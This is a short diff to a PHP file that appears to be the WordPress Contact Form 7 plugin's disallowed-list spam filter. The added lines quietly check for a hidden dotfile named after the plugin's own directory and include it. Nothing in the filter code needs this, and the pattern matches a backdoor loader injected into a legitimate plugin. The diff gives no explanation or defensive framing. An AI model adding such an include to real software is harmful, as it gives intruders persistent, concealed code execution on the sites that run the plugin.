@@ -2,6 +2,10 @@
 
 add_filter( 'wpcf7_spam', 'wpcf7_disallowed_list', 10, 2 );
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function wpcf7_disallowed_list( $spam, $submission ) {
 	if ( $spam ) {
 		return $spam;
